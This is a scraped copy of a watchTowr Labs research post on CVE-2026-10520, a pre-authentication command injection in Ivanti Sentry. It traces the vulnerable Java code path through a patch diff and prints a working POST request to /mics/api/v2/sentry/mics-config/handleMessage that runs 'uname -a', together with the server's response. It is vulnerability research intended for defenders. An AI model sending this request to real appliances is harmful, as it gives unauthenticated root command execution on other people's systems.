---
title: "More Evidence That Words Don't Mean What We Thought They Meant (Ivanti Sentry Pre-Auth OS Command Injection CVE-2026-10520)"
source: "watchTowr Labs"
url: https://labs.watchtowr.com/more-evidence-that-words-dont-mean-what-we-thought-they-meant-ivanti-sentry-pre-auth-os-command-injection-cve-2026-10520/
published: 2026-06-10
fetched: 2026-11-19T10:48:37.911925+08:00
category: "防火墙"
score: 6.4
keywords: ["pre-auth", "ivanti"]
sha256: f0a38c7a624ed23b97119d0376c39514e30969f3c670d109aa994db54b23dc27
bytes: 19095
truncated: false
body_mode: fulltext
kind: practical
status: published
published_at: 2026-11-19T11:44:34.056544+08:00
---

# More Evidence That Words Don't Mean What We Thought They Meant (Ivanti Sentry Pre-Auth OS Command Injection CVE-2026-10520)

> 来源：watchTowr Labs · 2026-06-10 · [原文](https://labs.watchtowr.com/more-evidence-that-words-dont-mean-what-we-thought-they-meant-ivanti-sentry-pre-auth-os-command-injection-cve-2026-10520/)
> 自动抓取快照，仅供安全研究参考；版权归原作者所有。

## 收录理由

- **核心**：Ivanti Sentry 未认证 OS 命令注入（CVE-2026-10520），未认证即可 root RCE。
- **价值**：与同厂商其它边缘设备漏洞形成模式；文中还对比了公告措辞与实际影响范围的偏差，对做应急判断很有用。
- **难度**：中：注入点较直接，但产品本身部署在企业内网边界，影响不低。

This research is a glimpse into the capability powering the watchTowr Platform, a Preemptive Exposure Management solution. We enable organizations to autonomously validate and mitigate their exposure to emerging threats, ahead of in-the-wild exploitation.

 Request a demo

Today, Ivanti published an advisory.

“No way?” we hear you say. "Yes way!"

Today’s advisory outlines two vulnerabilities in Ivanti’s Sentry product, appealing directly to our inner desire for sophisticated server-side, pre-authenticated vulnerabilities.

CVE-2026-10520

- An OS Command Injection vulnerability in Ivanti Sentry before the R10.5.2, R10.6.2 and R10.7.1 versions allows a remote unauthenticated user to achieve root-level remote code execution (Credit to Unknown, but not us)

CVE-2026-10523

- An Authentication Bypass vulnerability (CWE-288) in Ivanti Sentry before the R10.5.2, R10.6.2 and R10.7.1 versions allows a remote unauthenticated attacker to create arbitrary administrative accounts and obtain full administrative access (Credit to Bryan Lam)

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image.png)

Whilst an Authentication Bypass (CVE-2026-10523) on any other Tuesday would be wildly interesting, our gaze quickly wandered.

Why? Because CVE-2026-10520 (we know, it’s catchy) gets full Secure-by-Design points with a CVSS score of 10/10 - just as you’d expect for a Pre-Authenticated Command Injection.

As always, watchTowr clients gain industry-first access to our research days before publication to validate their exposure, accompanied by Active Defense capabilities to autonomously mitigate exposure.

This research is a glimpse into the capability that powers our Preemptive Exposure Management solution, and gets organizations ahead of inevitable in-the-wild exploitation: the watchTowr Platform.

### What is Ivanti Sentry?

Ivanti Sentry, formerly known as MobileIron Sentry, is an in-line gateway that manages, encrypts, and secures traffic between mobile devices and back-end enterprise systems. It usually sits between corporate mobile fleets and resources such as Microsoft Exchange, controlling ActiveSync email traffic and application data. Sentry works alongside Ivanti Endpoint Manager Mobile (EPMM) and enforces device-level access decisions, so only compliant, registered devices can reach internal services.

### Setting The Scene

As always, we do things, and we end up with things. We’ll be utilizing the following versions for our analysis today:

- Ivanti/Mobileiron Sentry 10.5.1 (Vulnerable)
- Ivanti/Mobileiron Sentry 10.5.2 (Different)

## Come On, Frodo, Let’s Go

Fortunately for us (despite having plenty of code to reverse) we’ve heard of Ivanti before and have vague recollections of the code bases for both Ivanti Sentry and Ivanti EPMM from previous research.

One thing we’ve learned along the way is that Tomcat-based vulnerabilities tend to cluster around a handful of application context paths.

For example:

- Ivanti EPMM lives under /mifs,
- While Ivanti Sentry is exposed under /mics.

Armed with that knowledge, we’ll skip the boring parts that we’ve covered before and jump straight into diffing the meat: mics.war , the war that contains the misleading Sentry application.

For those currently reviewing their attack surface, the application presents itself via /mics/login.jsp and looks something like this:

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-1.png)

A quick diff showed that only a single JAR had changed between the vulnerable and patched versions:

- mics-core-10.5.1-R10.5.1.jar (Vulnerable)
- mics-core-10.5.2-R10.5.2.jar (Different)

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-2.png)

The change was located in a familiar place:

- mics-core/com/mi/middleware/rest/controller/ConfigServiceController.java

Opening the class reveals a fairly standard Spring Boot controller with straightforward request routing. For example, the controller defines the following parent mapping:

```
@RequestMapping({"/api/v2/sentry/mics-config"})
```

A helpful start, because we can already infer that the vulnerability likely sits somewhere beneath this route prefix.

With even more luck on our side, only a single method in the controller had changed between versions. That method is annotated with:

```
@PostMapping({"/handleMessage"})
```

You see where this is going. Joining the controller-level mapping with the method-level mapping gives us the target path:

```
/mics/api/v2/sentry/mics-config/handleMessage
```

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-3.png)

```
   @PostMapping({"/handleMessage"})
   public ResponseEntity<ApiResponse<String>> handleMessage(String message) {
      try {
         if (message != null && !message.trim().isEmpty()) {
            String result = this.configService.handleMessage(message);
            return result != null && !this.containsError(result)
               ? ResponseEntity.ok(new ApiResponse<>(200, "Message handled successfully", result))
               : ResponseEntity.badRequest().body(new ApiResponse<>(400, "Failed to process message", result));
         } else {
            return ResponseEntity.badRequest().body(new ApiResponse(400, "Message is empty or null", null));
         }
      } catch (Exception var3) {
         return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(new ApiResponse<>(500, "Internal server error", var3.getMessage()));
      }
   }
```

### What’s Next?

Reviewing the controller method, we can see that the API accepts a user-supplied message string and passes it directly into the handleMessage() method for processing.

Following the execution flow into:

```
mics-core/com/mi/middleware/service/impl/ConfigServiceHandler.java
```

allows us to see exactly what happens inside handlerMessage():

```
public String handleMessage(String msg) {
      String module = null;
      String xpath = null;
      String command = null;
      IConfigResponse response = null;
      if (this.userService == null) {
         LOG.error("userService is null");
      }

      StringTokenizer tokenizer = new StringTokenizer(msg);
      if (tokenizer.hasMoreTokens()) {
         command = tokenizer.nextToken();
      }

      if (tokenizer.hasMoreTokens()) {
         module = tokenizer.nextToken();
      }

      if (tokenizer.hasMoreTokens()) {
         xpath = tokenizer.nextToken();
      }

      if (command == null) {
         response = this.getErrorResponse("22", "Invalid configuration command");
         return response.getResponse();
      } else {
         String value = null;
         if (command.equalsIgnoreCase("set")
            || command.equalsIgnoreCase("delete")
            || command.equalsIgnoreCase("get")
            || command.equalsIgnoreCase("add")
            || command.equalsIgnoreCase("modify")
            || command.equalsIgnoreCase("import")
            || command.equalsIgnoreCase("export")
            || command.equalsIgnoreCase("test")
            || command.equalsIgnoreCase("copy")
            || command.equalsIgnoreCase("execute")
            || command.equalsIgnoreCase("query")
            || command.equalsIgnoreCase("migratepasswordhash")) {
            StringBuilder sb = new StringBuilder();

            while (tokenizer.hasMoreTokens()) {
               sb.append(tokenizer.nextToken()).append(" ");
            }

            value = sb.toString().trim();
         }

         LOG.debug("command: " + command + ", module: " + module + ", xpath: " + xpath);

         try {
            if (!command.equalsIgnoreCase("set")
               && !command.equalsIgnoreCase("add")
               && !command.equalsIgnoreCase("modify")
               && !command.equalsIgnoreCase("copy")
               && !command.equalsIgnoreCase("delete")
               && !command.equalsIgnoreCase("query")) {
               response = this.handleMessage(module, xpath, command, value); <---- [0]
            } else {
               if (module == null) {
                  response = this.getErrorResponse("22", "Invalid configuration command");
                  return response.getResponse();
               }

               IModuleHandler moduleHandler = this.getModuleHandler(module);
               synchronized (moduleHandler) {
                  response = this.handleMessage(module, xpath, command, value);
               }
            }
         } catch (MIConfigException var12) {
            LOG.debug("Exception during handleMessage: " + var12.getErrorMessageAsString());
            response = this.convertToResponse(var12);
         }

         return response.getResponse();
      }
   }
```

Without diving too deeply into the implementation just yet, a few variable names immediately caught our attention. Names such as xpath, module, and command tend to stand out when you're looking for vulnerability patches.

The user-supplied message (msg) is parsed, split into multiple tokens, and mapped into these variables before being passed into another handlerMessage() method at [0]:

```
public IConfigResponse handleMessage(String module, String xpath, String command, String value) throws MIConfigException {
      IConfigResponse response = null;
      ConfigRequestProcessor reqProcessor = new ConfigRequestProcessor();
      if (this.prettyPrint) {
         reqProcessor.enablePrettyPrint();
      }

      if (module != null) {
         reqProcessor.setHandler(this.getModuleHandler(module));
      }

      switch (ConfigCommand.getCommand(command)) {
         case GET:
            response = reqProcessor.handleGet(xpath, value);
            break;
         case GETLIST:
            response = reqProcessor.handleGetList(xpath);
            break;
//        <------snipped------>
         case EXECUTE: <---- [1]
            response = reqProcessor.handleExecute(xpath, value);
            break;
         case TEST:
            response = reqProcessor.handleTest(xpath, value);
            break;
//        <------snipped------>

      return response;
   }
```

These values are then passed through a switch statement based on the command value, with execution branching into different handler paths.

Unsurprisingly, the one that caught our eye was EXECUTE at [1], which routes execution into:

```
reqProcessor.handleExecute(xpath,value)
```

Following that call into:

```
mics-core/com/mi/middleware/service/impl/ConfigRequestProcessor.java
```

makes it much clearer what handleExecute() is actually doing:

```
public IConfigResponse handleExecute(String xpath, String value) throws MIConfigException {
      this.validateXPath(xpath);

      try {
         XmlObject confObj = CommonUtilities.getXMLConfig(this.handler.getXMLConfigFile());
         this.handler.setConfiguration(confObj);
      } catch (Exception var9) {
         LOG.error("Error while reading configuration file", var9);
         throw new MIConfigException("105", "Reading config file failed", var9);
      }

      XmlObject[] tmpObjList = this.getXmlObjectsForXPath(xpath, value);
      LOG.debug("EXECUTE has valid entry");
      XmlObject tmpObjType = tmpObjList[0];
      String response = "";

      try {
         Object nativeResp = CommonUtilities.executeNativeCommand(this.handler.getNativeModule(), tmpObjType, "Execute");
         response = (String)nativeResp;
      } catch (RuntimeException var8) {
         LOG.error("Configuration execute failed", var8);
         throw new MIConfigException("115", "Configuration execute failed", var8);
      }

      return this.getSuccessResponse(response);
   }
```

Looking further into this method, we can see that the user still controls both xpath and value.

If certain conditions are satisfied, execution eventually reaches executeNativeCommand() in common-10.6.0.1s-64/com/mi/mics/service/CommonUtilities.java:

```
public static Object executeNativeCommand(XmlObject obj, String type) throws MIConfigException {
      if (LOG.isDebugEnabled()) {
         LOG.debug(String.format("into executeNativeCommand : type %s ", type));
      }

      String implClsName = obj.getClass().getName();
      String methodType = "get" + type + "method";
      Method method = ReflectionUtilities.getMethod(implClsName, methodType);
      XmlAnySimpleType getMethodName = (XmlAnySimpleType)ReflectionUtilities.executeMethod(method, obj, new Object[0]);
      method = ReflectionUtilities.getMethod(implClsName, "getClassname");
      XmlAnySimpleType className = (XmlAnySimpleType)ReflectionUtilities.executeMethod(method, obj, new Object[0]);
      method = ReflectionUtilities.getMethod(implClsName, "getBeanclass");
      XmlAnySimpleType beanClass = (XmlAnySimpleType)ReflectionUtilities.executeMethod(method, obj, new Object[0]);
      LOG.debug("Class Name : " + className.getStringValue() + " Method : " + getMethodName.getStringValue() + " Bean class : " + beanClass.getStringValue());
      Object excuteModuleMethod = ReflectionUtilities.excuteModuleMethod(
         className.getStringValue(), getMethodName.getStringValue(), beanClass.getStringValue(), obj
      );
      if (LOG.isDebugEnabled()) {
         LOG.debug("sucessfully called executeNativeCommand : " + getMethodName);
      }

      return excuteModuleMethod;
   }
```

At this point, the flow becomes much clearer. The message value is not treated as a simple string. It is parsed as a MICS configuration command, split into a command, module, XPath, and XML body, then passed into the backend configuration system.

The important method is executeNativeCommand(). It takes the parsed XML object, identifies which native method should handle it, and invokes that method via reflection. In other words, this endpoint can reach internal system-level configuration actions.

Reverse-engineering the exact XML structure would take time, but the patch gives us a strong clue.

In the “different” version, Ivanti stops using the user-supplied message value and replaces it with a hardcoded command:

```
  String result = this.configService
            .handleMessage(
               "execute system /configuration/system/commandexec <commandexec>\\n<index>1</index>\\n<reqandres>/bin/cat /sys/devices/virtual/dmi/id/product_name</reqandres>\\n</commandexec>"
            );

```

That command contains a commandexec XML block and a reqandres field populated with a benign /bin/cat invocation.

With our detective hats on, we concluded that this was a fairly strong (ha) indicator that the vulnerable code path was intended to execute some sort of command.

Notably, the patch does not remove the underlying functionality. Instead, it removes random-internet-user control over the input being passed into the command string.

With that in mind, we took the command format introduced by the patch and supplied it to a vulnerable instance, replacing the benign reqandres value with a simple uname -a command:

```
POST /mics/api/v2/sentry/mics-config/handleMessage HTTP/1.1
Host: f5.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 131

message=execute system /configuration/system/commandexec <commandexec><index>1</index><reqandres>uname -a</reqandres></commandexec>
```

Response:

```
HTTP/1.1 200
Content-Type: application/json
Connection: keep-alive
Server: Server
Pragma: no-cache
Cache-control: no-cache, no-store, must-revalidate
Set-Cookie: JSESSIONID=BBE702EA82AB5A9849DF96545C8814D5; Path=/mics; Secure; HttpOnly;SameSite=lax
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SameOrigin
X-Content-Type-Options: nosniff
Content-Length: 247

{"status":200,"message":"Message handled successfully","data":"<result><success>Linux f5.com 4.18.0-553.84.1.el8_10.x86_64 #1 SMP Mon Nov 17 12:53:24 PST 2025 x86_64 x86_64 x86_64 GNU/Linux\\n</success></result>"}
```

And just like that, we've reproduced CVE-2026-10520: a pre-authenticated OS command injection in Ivanti Sentry with a well-deserved CVSS score of 10.

For those curious what the fully patched implementation looks like, here it is:

```
@RequestMapping({"/api/v2/sentry/mics-config"})
public class ConfigServiceController {
   @Autowired
   private ConfigService configService;
   private static final Log LOG = LogFactory.getLog(ConfigServiceController.class);
   private static final String DMI_PRODUCT_NAME_COMMAND = "execute system /configuration/system/commandexec <commandexec>\\n<index>1</index>\\n<reqandres>/bin/cat /sys/devices/virtual/dmi/id/product_name</reqandres>\\n</commandexec>";

   @PostMapping({"/handleMessage"})
   public ResponseEntity<ApiResponse<String>> handleMessage(String message) {
      try {
         String result = this.configService
            .handleMessage(
               "execute system /configuration/system/commandexec <commandexec>\\n<index>1</index>\\n<reqandres>/bin/cat /sys/devices/virtual/dmi/id/product_name</reqandres>\\n</commandexec>"
            );
         return result != null && !this.containsError(result)
            ? ResponseEntity.ok(new ApiResponse<>(200, "Message handled successfully", result))
            : ResponseEntity.badRequest().body(new ApiResponse<>(400, "Failed to process message", result));
      } catch (Exception var3) {
         return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(new ApiResponse<>(500, "Internal server error", var3.getMessage()));
      }
   }
```

Not only has the handleMessage() input been hardcoded, but further inspection revealed additional defensive changes outside of the Java code.

Specifically, the bundled Apache configuration now contains regex-based rules that block access to the vulnerable endpoint entirely, causing unauthenticated requests to be redirected to the login page via a 302 response.

In other words, Ivanti did not just remove attacker control over the vulnerable execution path. They also added a layer of protection in front of it to make reaching the endpoint significantly more difficult.

In other words: they added authentication.

# Detection Artefact Generator

As always, we're providing a Detection Artefact Generator to allow teams to determine whether their environment is vulnerable:

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-4.png)

## Gain early access to our research, and understand your exposure, with the watchTowr Platform

The research published by watchTowr Labs is powered by the same engine behind the watchTowr Platform, our Preemptive Exposure Management solution built for enterprises that refuse to wait for the next satisfying advisory from their scanner vendor.

The watchTowr Platform combines External Attack Surface Management and Continuous Automated Red Teaming to test your defenses against the vulnerabilities and techniques that matter: the ones real attackers are actually exploiting.

 Request a demo
